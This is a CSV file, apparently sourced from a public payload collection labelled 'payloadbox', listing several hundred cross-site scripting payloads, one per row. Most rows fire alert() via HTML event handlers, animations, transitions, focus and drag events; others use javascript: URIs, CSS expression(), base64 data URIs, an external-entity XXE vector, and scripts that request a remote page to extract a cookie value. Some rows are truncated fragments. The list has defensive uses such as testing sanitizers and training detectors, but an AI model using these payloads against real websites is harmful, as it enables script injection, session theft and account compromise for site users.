text,source
"<style>:target {color:red;}</style><header id=x style=""transition:color 1s"" ontransitionend=alert(1)></header>",payloadbox
"<svg ondblclick=""alert(1)"">test</svg>",payloadbox
<xss id=x tabindex=1 ondeactivate=alert(1)></xss><input autofocus>,payloadbox
"<dd onmouseout=""alert(1)"">test</dd>",payloadbox
<isindex id=x tabindex=1 onfocusin=alert(1)></isindex>,payloadbox
"<audio onmouseleave=""alert(1)"">test</audio>",payloadbox
<embed src=1 onerror=alert(1) type=image/gif>,payloadbox
"<legend onmouseover=""alert(1)"">test</legend>",payloadbox
"<input oncopy=alert(1) value=""XSS"" autofocus>",payloadbox
"<li draggable=""true"" ondragstart=""alert(1)"">test</li>",payloadbox
"<area onkeypress=""alert(1)"" contenteditable>test</area>",payloadbox
"<style>@keyframes x{}</style><legend style=""animation-name:x"" onanimationend=""alert(1)""></legend>",payloadbox
<summary id=x tabindex=1 onfocusin=alert(1)></summary>,payloadbox
<input type=checkbox id=x onfocusin=alert(1)>,payloadbox
"<col draggable=""true"" ondragleave=""alert(1)"">test</col>",payloadbox
<shadow id=x tabindex=1 onfocusin=alert(1)></shadow>,payloadbox
"<basefont onmouseleave=""alert(1)"">test</basefont>",payloadbox
"<rt onmouseover=""alert(1)"">test</rt>",payloadbox
"<section onmousedown=""alert(1)"">test</section>",payloadbox
"<bdo onbeforepaste=""alert(1)"" contenteditable>test</bdo>",payloadbox
"<thead onclick=""alert(1)"">test</thead>",payloadbox
"<base onclick=""alert(1)"">test</base>",payloadbox
"<div id=""94""><svg xmlns=""http://www.w3.org/2000/svg"">",payloadbox
"<picture><source srcset=""validimage.png""><img onloadstart=alert(1)></picture>",payloadbox
"<figcaption onkeypress=""alert(1)"" contenteditable>test</figcaption>",payloadbox
"<nobr onmouseover=""alert(1)"">test</nobr>",payloadbox
"<figcaption oncontextmenu=""alert(1)"">test</figcaption>",payloadbox
"<slot draggable=""true"" ondragend=""alert(1)"">test</slot>",payloadbox
"<data draggable=""true"" ondragstart=""alert(1)"">test</data>",payloadbox
"<style>@keyframes x{}</style><dt style=""animation-name:x"" onanimationstart=""alert(1)""></dt>",payloadbox
"<ins onbeforecut=""alert(1)"" contenteditable>test</ins>",payloadbox
"<dfn onmousemove=""alert(1)"">test</dfn>",payloadbox
"<style>:target {color: red;}</style><menuitem id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></menuitem>",payloadbox
<audio src onloadstart=alert(1)>,payloadbox
"<img onmouseover=""alert(1)"">test</img>",payloadbox
<template id=x tabindex=1 onfocusin=alert(1)></template>,payloadbox
"<video controls autoplay onended=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",payloadbox
"<kbd onmouseover=""alert(1)"">test</kbd>",payloadbox
"<!-- injection --><svg height=""50px"">",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><legend ondragover=alert(1) contenteditable>drop here</legend>",payloadbox
<param id=x tabindex=1 onactivate=alert(1)></param>,payloadbox
"<head oncontextmenu=""alert(1)"">test</head>",payloadbox
"<noscript onpaste=""alert(1)"" contenteditable>test</noscript>",payloadbox
"<style>:target {color:red;}</style><table id=x style=""transition:color 1s"" ontransitionend=alert(1)></table>",payloadbox
"<pre onmousedown=""alert(1)"">test</pre>",payloadbox
"<div id=""66""><?xml version=""1.0""?>",payloadbox
"<rt onmousemove=""alert(1)"">test</rt>",payloadbox
"<style>@keyframes x{}</style><dl style=""animation-name:x"" onanimationend=""alert(1)""></dl>",payloadbox
<slot id=x tabindex=1 onactivate=alert(1)></slot>,payloadbox
"<param onkeyup=""alert(1)"" contenteditable>test</param>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><base ondrop=alert(1) contenteditable>drop here</base>",payloadbox
"<style>:target {transform: rotate(180deg);}</style><i id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></i>",payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><menuitem id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></menuitem>",payloadbox
<kbd id=x tabindex=1 onbeforedeactivate=alert(1)></kbd><input autofocus>,payloadbox
"<noscript oncopy=""alert(1)"" contenteditable>test</noscript>",payloadbox
<fieldset id=x tabindex=1 onactivate=alert(1)></fieldset>,payloadbox
<svg><ul onload=alert(1)></ul>,payloadbox
"<ins onclick=""alert(1)"">test</ins>",payloadbox
"<em onmousedown=""alert(1)"">test</em>",payloadbox
<X onxxx=1,payloadbox
"<samp ondblclick=""alert(1)"">test</samp>",payloadbox
"<style>@keyframes x{}</style><picture style=""animation-name:x"" onanimationend=""alert(1)""></picture>",payloadbox
"<plaintext onmouseout=""alert(1)"">test</plaintext>",payloadbox
"<style>:target {color:red;}</style><track id=x style=""transition:color 1s"" ontransitionend=alert(1)></track>",payloadbox
"<D3""<""/OncLick=""1>[confirm``]""<"">z",payloadbox
"<embed onmouseup=""alert(1)"">test</embed>",payloadbox
<rtc id=x tabindex=1 onbeforeactivate=alert(1)></rtc>,payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><ruby id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></ruby>",payloadbox
<main id=x tabindex=1 ondeactivate=alert(1)></main><input id=y autofocus>,payloadbox
"<base onkeypress=""alert(1)"" contenteditable>test</base>",payloadbox
"<style>@keyframes x{}</style><rb style=""animation-name:x"" onanimationstart=""alert(1)""></rb>",payloadbox
"<style>@keyframes x{}</style><dialog style=""animation-name:x"" onanimationstart=""alert(1)""></dialog>",payloadbox
"<audio onclick=""alert(1)"">test</audio>",payloadbox
"<style onmouseleave=""alert(1)"">test</style>",payloadbox
"<acronym ondblclick=""alert(1)"">test</acronym>",payloadbox
<link id=x tabindex=1 onbeforeactivate=alert(1)></link>,payloadbox
"<style>@keyframes x{}</style><li style=""animation-name:x"" onanimationend=""alert(1)""></li>",payloadbox
"<xmp draggable=""true"" ondragstart=""alert(1)"">test</xmp>",payloadbox
"<marquee onmousedown=""alert(1)"">test</marquee>",payloadbox
"<u onmouseenter=""alert(1)"">test</u>",payloadbox
<textarea onpaste=alert(1) autofocus></textarea>,payloadbox
"<table onmousemove=""alert(1)"">test</table>",payloadbox
<q id=x tabindex=1 ondeactivate=alert(1)></q><input id=y autofocus>,payloadbox
"<content onpaste=""alert(1)"" contenteditable>test</content>",payloadbox
<i onblur=alert(1) tabindex=1 id=x></i><input autofocus>,payloadbox
"<header ondblclick=""alert(1)"">test</header>",payloadbox
"<nextid onmouseover=""alert(1)"">test</nextid>",payloadbox
"<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe id=iframe src=%22javascript:parent.x(window)%22><iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();",payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tr id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></tr>",payloadbox
"<iframe onmousedown=""alert(1)"">test</iframe>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><tbody ondragover=alert(1) contenteditable>drop here</tbody>",payloadbox
"<html onbeforepaste=""alert(1)"" contenteditable>test</html>",payloadbox
"<strong onmousemove=""alert(1)"">test</strong>",payloadbox
"<li ondblclick=""alert(1)"">test</li>",payloadbox
"<dt draggable=""true"" ondragstart=""alert(1)"">test</dt>",payloadbox
"<tfoot oncontextmenu=""alert(1)"">test</tfoot>",payloadbox
"<style>@keyframes x{}</style><font style=""animation-name:x"" onanimationstart=""alert(1)""></font>",payloadbox
"<label draggable=""true"" ondragenter=""alert(1)"">test</label>",payloadbox
"<isindex onbeforecut=""alert(1)"" contenteditable>test</isindex>",payloadbox
"<cite draggable=""true"" ondragend=""alert(1)"">test</cite>",payloadbox
"<animate attributeName=""onunload"" to=""alert(89)""/>",payloadbox
"<div id=""69""><card xmlns=""http://www.wapforum.org/2001/wml""><onevent type=""ontimer""><go href=""javascript:alert(69)""/></onevent><timer value=""1""/></card>//[""'`-->]]>]</div><div id=""70""><div style=width:1px;filter:glow onfilterchange=alert(70)>x</div>//[""'`-->]]>]</div><div id=""71""><// style=x:expression\28alert(71)\29>//[""'`-->]]>]</div><div id=""72""><form><button formaction=""javascript:alert(72)"">X</button>//[""'`-->]]>]</div><div id=""73""><event-source src=""event.php"" onload=""alert(73)"">//[""'`-->]]>]</div><div id=""74""><a href=""javascript:alert(74)""><event-source src=""data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A"" /></a>//[""'`-->]]>]</div><div id=""75""><script<{alert(75)}/></script </>//[""'`-->]]>]</div><div id=""76""><?xml-stylesheet type=""text/css""?><!DOCTYPE x SYSTEM ""test.dtd""><x>&x;</x>//[""'`-->]]>]</div><div id=""77""><?xml-stylesheet type=""text/css""?><root style=""x:expression(alert(77))""/>//[""'`-->]]>]</div><div id=""78""><?xml-stylesheet type=""text/xsl"" href=""#""?><img xmlns=""x-schema:test.xdr""/>//[""'`-->]]>]</div><div id=""79""><object allowscriptaccess=""always"" data=""test.swf""></object>//[""'`-->]]>]</div><div id=""80""><style>*{x:ｅｘｐｒｅｓｓｉｏｎ(alert(80))}</style>//[""'`-->]]>]</div><div id=""81""><x xmlns:xlink=""http://www.w3.org/1999/xlink"" xlink:actuate=""onLoad"" xlink:href=""javascript:alert(81)"" xlink:type=""simple""/>//[""'`-->]]>]</div><div id=""82""><?xml-stylesheet type=""text/css"" href=""data:,*%7bx:expression(write(2));%7d""?>//[""'`-->]]>]</div>",payloadbox
"<style>@keyframes slidein {}</style><ul style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></ul>",payloadbox
<label id=x tabindex=1 onbeforeactivate=alert(1)></label>,payloadbox
<nobr id=x tabindex=1 onfocus=alert(1)></nobr>,payloadbox
"<progress onmouseleave=""alert(1)"">test</progress>",payloadbox
"<style>@keyframes x{}</style><dfn style=""animation-name:x"" onanimationend=""alert(1)""></dfn>",payloadbox
"<div id=""123""><span class=foo>Some text</span>",payloadbox
"<style>:target {color:red;}</style><hgroup id=x style=""transition:color 1s"" ontransitionend=alert(1)></hgroup>",payloadbox
"<frame draggable=""true"" ondragenter=""alert(1)"">test</frame>",payloadbox
"<style>:target {transform: rotate(180deg);}</style><main id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></main>",payloadbox
"<main onbeforecopy=""alert(1)"" contenteditable>test</main>",payloadbox
"<isindex onbeforecopy=""alert(1)"" contenteditable>test</isindex>",payloadbox
"<caption onclick=""alert(1)"">test</caption>",payloadbox
"<span onbeforepaste=""alert(1)"" contenteditable>test</span>",payloadbox
"<col onkeyup=""alert(1)"" contenteditable>test</col>",payloadbox
"<style>@keyframes slidein {}</style><tr style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></tr>",payloadbox
"<figure onmouseenter=""alert(1)"">test</figure>",payloadbox
"<article onclick=""alert(1)"">test</article>",payloadbox
<code onblur=alert(1) tabindex=1 id=x></code><input autofocus>,payloadbox
<svg><keygen onload=alert(1)></keygen>,payloadbox
"<style>@keyframes slidein {}</style><nav style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></nav>",payloadbox
"<q oncopy=""alert(1)"" contenteditable>test</q>",payloadbox
"<style>:target {transform: rotate(180deg);}</style><noembed id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></noembed>",payloadbox
"<div id=""44""><style>*[{}@import'test.css?]{color: green;}</style>X//[""'`-->]]>]</div><div id=""45""><div style=""font-family:'foo[a];color:red;';"">XXX</div>//[""'`-->]]>]</div><div id=""46""><div style=""font-family:foo}color=red;"">XXX</div>//[""'`-->]]>]</div><div id=""47""><svg xmlns=""http://www.w3.org/2000/svg""><script>alert(47)</script></svg>//[""'`-->]]>]</div><div id=""48""><SCRIPT FOR=document EVENT=onreadystatechange>alert(48)</SCRIPT>//[""'`-->]]>]</div><div id=""49""><OBJECT CLASSID=""clsid:333C7BC4-460F-11D0-BC04-0080C7055A83""><PARAM NAME=""DataURL"" VALUE=""javascript:alert(49)""></OBJECT>//[""'`-->]]>]</div><div id=""50""><object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""></object>//[""'`-->]]>]</div><div id=""51""><embed src=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""></embed>//[""'`-->]]>]</div><div id=""52""><x style=""behavior:url(test.sct)"">//[""'`-->]]>]</div>",payloadbox
"<nextid onmouseleave=""alert(1)"">test</nextid>",payloadbox
"<style>@keyframes slidein {}</style><progress style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></progress>",payloadbox
"<tt onmouseenter=""alert(1)"">test</tt>",payloadbox
"<style>@keyframes x{}</style><main style=""animation-name:x"" onanimationend=""alert(1)""></main>",payloadbox
<menu id=x tabindex=1 onbeforedeactivate=alert(1)></menu><input autofocus>,payloadbox
"<style>:target {color:red;}</style><meta id=x style=""transition:color 1s"" ontransitionend=alert(1)></meta>",payloadbox
"<dialog oncut=""alert(1)"" contenteditable>test</dialog>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><acronym ondrop=alert(1) contenteditable>drop here</acronym>",payloadbox
"<wbr onmouseleave=""alert(1)"">test</wbr>",payloadbox
<? echo('<SCR)';,payloadbox
"<div draggable=""true"" contenteditable>drag me</div><q ondrop=alert(1) contenteditable>drop here</q>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><bdo ondragover=alert(1) contenteditable>drop here</bdo>",payloadbox
"<hr draggable=""true"" ondragleave=""alert(1)"">test</hr>",payloadbox
"<header onkeyup=""alert(1)"" contenteditable>test</header>",payloadbox
"<tbody onclick=""alert(1)"">test</tbody>",payloadbox
"<keygen oncontextmenu=""alert(1)"">test</keygen>",payloadbox
"<u onmouseout=""alert(1)"">test</u>",payloadbox
<svg><animate onbegin=alert(1) attributeName=x dur=1s>,payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><multicol id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></multicol>",payloadbox
"<progress onbeforecopy=""alert(1)"" contenteditable>test</progress>",payloadbox
<style id=x tabindex=1 onfocusin=alert(1)></style>,payloadbox
"<b ondblclick=""alert(1)"">test</b>",payloadbox
"<dt onkeypress=""alert(1)"" contenteditable>test</dt>",payloadbox
"<td oncut=""alert(1)"" contenteditable>test</td>",payloadbox
"<A href=""javascript%26colon;confirm()"">click",payloadbox
<aside id=x tabindex=1 onfocusin=alert(1)></aside>,payloadbox
<nav onblur=alert(1) tabindex=1 id=x></nav><input autofocus>,payloadbox
"<style>@keyframes slidein {}</style><object style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></object>",payloadbox
"<dialog onbeforepaste=""alert(1)"" contenteditable>test</dialog>",payloadbox
<li onblur=alert(1) tabindex=1 id=x></li><input autofocus>,payloadbox
<svg><command onload=alert(1)></command>,payloadbox
"<em onclick=""alert(1)"">test</em>",payloadbox
<SCRIPT>a=/XSS/,payloadbox
"<figcaption draggable=""true"" ondrag=""alert(1)"">test</figcaption>",payloadbox
"<script>     function b() { return Safe.get(); } alert(b({type:String.fromCharCode(99,108,105,99,107),isTrusted:true})); </script>",payloadbox
"<datalist onmouseout=""alert(1)"">test</datalist>",payloadbox
"<style>@keyframes x{}</style><progress style=""animation-name:x"" onanimationstart=""alert(1)""></progress>",payloadbox
<p id=x tabindex=1 onbeforedeactivate=alert(1)></p><input autofocus>,payloadbox
"<div id=""64""><!DOCTYPE x[<!ENTITY x SYSTEM ""http://html5sec.org/test.xxe"">]><y>&x;</y>//[""'`-->]]>]</div><div id=""65""><svg onload=""javascript:alert(65)"" xmlns=""http://www.w3.org/2000/svg""></svg>//[""'`-->]]>]</div>",payloadbox
"<style>:target {transform: rotate(180deg);}</style><dt id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></dt>",payloadbox
"<select onkeyup=""alert(1)"" contenteditable>test</select>",payloadbox
"<col onmouseover=""alert(1)"">test</col>",payloadbox
"<header onpaste=""alert(1)"" contenteditable>test</header>",payloadbox
"<rtc draggable=""true"" ondragend=""alert(1)"">test</rtc>",payloadbox
"<dt onkeyup=""alert(1)"" contenteditable>test</dt>",payloadbox
"<style>:target {color: red;}</style><dialog id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></dialog>",payloadbox
<body onfocus=alert(1)>,payloadbox
"<tfoot onbeforecopy=""alert(1)"" contenteditable>test</tfoot>",payloadbox
<marquee onfocusout=alert(1) tabindex=1 id=x></marquee><input autofocus>,payloadbox
<BODY ONLOAD=alert('XSS')>,payloadbox
"<div draggable=""true"" contenteditable>drag me</div><isindex ondrop=alert(1) contenteditable>drop here</isindex>",payloadbox
<hr id=x tabindex=1 onfocusin=alert(1)></hr>,payloadbox
<caption onfocusout=alert(1) tabindex=1 id=x></caption><input autofocus>,payloadbox
"<div draggable=""true"" contenteditable>drag me</div><h1 ondragover=alert(1) contenteditable>drop here</h1>",payloadbox
"<embed onkeypress=""alert(1)"" contenteditable>test</embed>",payloadbox
<area onfocusout=alert(1) tabindex=1 id=x></area><input autofocus>,payloadbox
"<dd onkeypress=""alert(1)"" contenteditable>test</dd>",payloadbox
"<menu draggable=""true"" ondragend=""alert(1)"">test</menu>",payloadbox
"<style>:target {transform: rotate(180deg);}</style><strong id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></strong>",payloadbox
"<data draggable=""true"" ondrag=""alert(1)"">test</data>",payloadbox
"<blockquote onpaste=""alert(1)"" contenteditable>test</blockquote>",payloadbox
"<marquee onkeydown=""alert(1)"" contenteditable>test</marquee>",payloadbox
"<multicol onmousedown=""alert(1)"">test</multicol>",payloadbox
"<style>:target {transform: rotate(180deg);}</style><big id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></big>",payloadbox
"<style>:target {color: red;}</style><bdo id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></bdo>",payloadbox
"<listing onmouseleave=""alert(1)"">test</listing>",payloadbox
"<br onkeydown=""alert(1)"" contenteditable>test</br>",payloadbox
"<iframe src=%22404%22 onload=%22self.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>",payloadbox
"<body draggable=""true"" ondragenter=""alert(1)"">test</body>",payloadbox
"<hgroup onkeyup=""alert(1)"" contenteditable>test</hgroup>",payloadbox
"<abbr draggable=""true"" ondragend=""alert(1)"">test</abbr>",payloadbox
"<datalist onbeforepaste=""alert(1)"" contenteditable>test</datalist>",payloadbox
"<embed draggable=""true"" ondragleave=""alert(1)"">test</embed>",payloadbox
"<element oncopy=""alert(1)"" contenteditable>test</element>",payloadbox
"<noembed onbeforepaste=""alert(1)"" contenteditable>test</noembed>",payloadbox
"<abbr onkeydown=""alert(1)"" contenteditable>test</abbr>",payloadbox
"<div id=""90""><!-- Up to Opera 10.63 -->",payloadbox
"<small onkeypress=""alert(1)"" contenteditable>test</small>",payloadbox
"<style>@keyframes x{}</style><progress style=""animation-name:x"" onanimationend=""alert(1)""></progress>",payloadbox
<bdi id=x tabindex=1 ondeactivate=alert(1)></bdi><input id=y autofocus>,payloadbox
<ol onfocusout=alert(1) tabindex=1 id=x></ol><input autofocus>,payloadbox
"<ins onmouseleave=""alert(1)"">test</ins>",payloadbox
"<html onmouseover=""alert(1)"">test</html>",payloadbox
<x onxxx=alert(1) 1=',payloadbox
"<style>@keyframes x{}</style><isindex style=""animation-name:x"" onanimationend=""alert(1)""></isindex>",payloadbox
"<style>:target {transform: rotate(180deg);}</style><wbr id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></wbr>",payloadbox
"<style>@keyframes x{}</style><section style=""animation-name:x"" onanimationstart=""alert(1)""></section>",payloadbox
<noscript id=x tabindex=1 ondeactivate=alert(1)></noscript><input id=y autofocus>,payloadbox
"<style>@keyframes x{}</style><blockquote style=""animation-name:x"" onanimationend=""alert(1)""></blockquote>",payloadbox
"<kbd draggable=""true"" ondrag=""alert(1)"">test</kbd>",payloadbox
"<bgsound oncut=""alert(1)"" contenteditable>test</bgsound>",payloadbox
"<div onbeforepaste=""alert(1)"" contenteditable>test</div>",payloadbox
<br id=x tabindex=1 onfocusin=alert(1)></br>,payloadbox
"<ol onbeforepaste=""alert(1)"" contenteditable>test</ol>",payloadbox
<D3/OnMouSEenTer=[2].find(confirm)>z,payloadbox
"<ul draggable=""true"" ondrag=""alert(1)"">test</ul>",payloadbox
"<noscript onmouseout=""alert(1)"">test</noscript>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><bdi ondrop=alert(1) contenteditable>drop here</bdi>",payloadbox
<basefont id=x tabindex=1 onbeforedeactivate=alert(1)></basefont><input autofocus>,payloadbox
<xmp id=x tabindex=1 onbeforeactivate=alert(1)></xmp>,payloadbox
"<base draggable=""true"" ondragenter=""alert(1)"">test</base>",payloadbox
<label id=x tabindex=1 onfocus=alert(1)></label>,payloadbox
"<form oncut=""alert(1)"" contenteditable>test</form>",payloadbox
"<colgroup draggable=""true"" ondrag=""alert(1)"">test</colgroup>",payloadbox
"<kbd onmouseleave=""alert(1)"">test</kbd>",payloadbox
<xss id=x tabindex=1 onfocusout=alert(1)></xss><input autofocus>,payloadbox
<article id=x tabindex=1 ondeactivate=alert(1)></article><input id=y autofocus>,payloadbox
<svg><section onload=alert(1)></section>,payloadbox
<fieldset id=x tabindex=1 onfocus=alert(1)></fieldset>,payloadbox
"<menuitem onbeforepaste=""alert(1)"" contenteditable>test</menuitem>",payloadbox
"<select oncopy=""alert(1)"" contenteditable>test</select>",payloadbox
"<mark onkeyup=""alert(1)"" contenteditable>test</mark>",payloadbox
"<style>:target {transform: rotate(180deg);}</style><frame id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></frame>",payloadbox
"<style>@keyframes slidein {}</style><rtc style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></rtc>",payloadbox
"<acronym onbeforecopy=""alert(1)"" contenteditable>test</acronym>",payloadbox
"<shadow onclick=""alert(1)"">test</shadow>",payloadbox
"<strong onkeyup=""alert(1)"" contenteditable>test</strong>",payloadbox
<title onfocusout=alert(1) tabindex=1 id=x></title><input autofocus>,payloadbox
"<div id=""104""><svg xmlns=""http://www.w3.org/2000/svg"" id=""foo"">",payloadbox
<details id=x tabindex=1 onbeforedeactivate=alert(1)></details><input autofocus>,payloadbox
"<strong oncontextmenu=""alert(1)"">test</strong>",payloadbox
"<td onmouseup=""alert(1)"">test</td>",payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><audio id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></audio>",payloadbox
"<mark oncontextmenu=""alert(1)"">test</mark>",payloadbox
<div id=x tabindex=1 onfocus=alert(1)></div>,payloadbox
"<caption onmouseout=""alert(1)"">test</caption>",payloadbox
"<html onbeforecopy=""alert(1)"" contenteditable>test</html>",payloadbox
"<option ondblclick=""alert(1)"">test</option>",payloadbox
"<applet onkeyup=""alert(1)"" contenteditable>test</applet>",payloadbox
"<spacer onmousedown=""alert(1)"">test</spacer>",payloadbox
<x oncut=alert(1)>copy this!,payloadbox
"<ruby onmousedown=""alert(1)"">test</ruby>",payloadbox
"%3Cscript%3Exhr=new%20ActiveXObject%28%22Msxml2.XMLHTTP%22%29;xhr.open%28%22GET%22,%22/xssme2%22,true%29;xhr.onreadystatechange=function%28%29{if%28xhr.readyState==4%26%26xhr.status==200%29{alert%28xhr.responseText.match%28/%27%28[^%27]%2b%29/%29[1]%29}};xhr.send%28%29;%3C/script%3E",payloadbox
"<div id=""100""><img[a][b]src=x[d]onerror[c]=[e]""alert(100)"">//[""'`-->]]>]</div><div id=""101""><a href=""[a]java[b]script[c]:alert(101)"">XXX</a>//[""'`-->]]>]</div><div id=""102""><img src=""x` `<script>alert(102)</script>""` `>//[""'`-->]]>]</div><div id=""103""><script>history.pushState(0,0,'/i/am/somewhere_else');</script>//[""'`-->]]>]</div>",payloadbox
"<noframes onmouseout=""alert(1)"">test</noframes>",payloadbox
"<style>:target {color: red;}</style><rp id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></rp>",payloadbox
<kbd id=x tabindex=1 ondeactivate=alert(1)></kbd><input id=y autofocus>,payloadbox
"<dir oncontextmenu=""alert(1)"">test</dir>",payloadbox
<svg><var onload=alert(1)></var>,payloadbox
"<style>@keyframes x{}</style><tfoot style=""animation-name:x"" onanimationstart=""alert(1)""></tfoot>",payloadbox
"<blink onbeforepaste=""alert(1)"" contenteditable>test</blink>",payloadbox
"<style>@keyframes slidein {}</style><iframe style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></iframe>",payloadbox
<svg><animatetransform onrepeat=alert(1) attributeName=transform repeatCount=2 dur=1s>,payloadbox
"<nobr draggable=""true"" ondragleave=""alert(1)"">test</nobr>",payloadbox
"<menuitem onkeyup=""alert(1)"" contenteditable>test</menuitem>",payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><frame id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></frame>",payloadbox
<fieldset onfocusout=alert(1) tabindex=1 id=x></fieldset><input autofocus>,payloadbox
<figure onblur=alert(1) tabindex=1 id=x></figure><input autofocus>,payloadbox
<object id=x tabindex=1 ondeactivate=alert(1)></object><input id=y autofocus>,payloadbox
"<picture onkeyup=""alert(1)"" contenteditable>test</picture>",payloadbox
<rp onfocusout=alert(1) tabindex=1 id=x></rp><input autofocus>,payloadbox
<base onblur=alert(1) tabindex=1 id=x></base><input autofocus>,payloadbox
"<textarea onkeydown=""alert(1)"" contenteditable>test</textarea>",payloadbox
<datalist onfocusout=alert(1) tabindex=1 id=x></datalist><input autofocus>,payloadbox
"<dir onkeydown=""alert(1)"" contenteditable>test</dir>",payloadbox
"<style>@keyframes x{}</style><aside style=""animation-name:x"" onanimationstart=""alert(1)""></aside>",payloadbox
"<bgsound onkeypress=""alert(1)"" contenteditable>test</bgsound>",payloadbox
"<style>@keyframes slidein {}</style><em style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></em>",payloadbox
"<frameset onkeyup=""alert(1)"" contenteditable>test</frameset>",payloadbox
"<element draggable=""true"" ondragleave=""alert(1)"">test</element>",payloadbox
"<span ondblclick=""alert(1)"">test</span>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><div ondragover=alert(1) contenteditable>drop here</div>",payloadbox
"<scRiPt y=""><"">/*<sCRipt* */prompt()</script",payloadbox
"<mark onkeypress=""alert(1)"" contenteditable>test</mark>",payloadbox
"<blink oncontextmenu=""alert(1)"">test</blink>",payloadbox
"<style>:target {color:red;}</style><section id=x style=""transition:color 1s"" ontransitionend=alert(1)></section>",payloadbox
"<style>:target {color:red;}</style><nextid id=x style=""transition:color 1s"" ontransitionend=alert(1)></nextid>",payloadbox
<!-- Up to Opera 11.64 - see link below -->,payloadbox
"<dir onbeforecut=""alert(1)"" contenteditable>test</dir>",payloadbox
"<script onclick=""alert(1)"">test</script>",payloadbox
"<label draggable=""true"" ondragend=""alert(1)"">test</label>",payloadbox
<tbody onblur=alert(1) tabindex=1 id=x></tbody><input autofocus>,payloadbox
